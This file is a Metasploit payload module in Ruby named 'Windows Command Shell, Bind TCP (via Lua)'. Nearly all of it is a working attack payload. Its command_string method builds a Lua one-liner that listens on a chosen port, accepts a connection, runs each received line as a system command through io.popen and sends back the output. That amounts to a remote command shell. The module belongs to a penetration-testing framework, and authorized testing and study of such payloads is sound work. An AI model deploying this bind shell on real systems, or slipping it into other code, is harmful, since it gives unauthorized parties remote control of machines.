##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  CachedSize = 223

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows Command Shell, Bind TCP (via Lua)',
      'Description'   => 'Listen for a connection and spawn a command shell via Lua',
      'Author'        =>
        [
          'xistence <xistence[at]0x90.nl>',
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_CMD,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'RequiredCmd'   => 'lua',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "lua -e \"local s=require('socket');local s=assert(socket.bind('*',#{datastore['LPORT']}));local c=s:accept();while true do local r,x=c:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));c:send(b);end;c:close();f:close();\""
  end

end

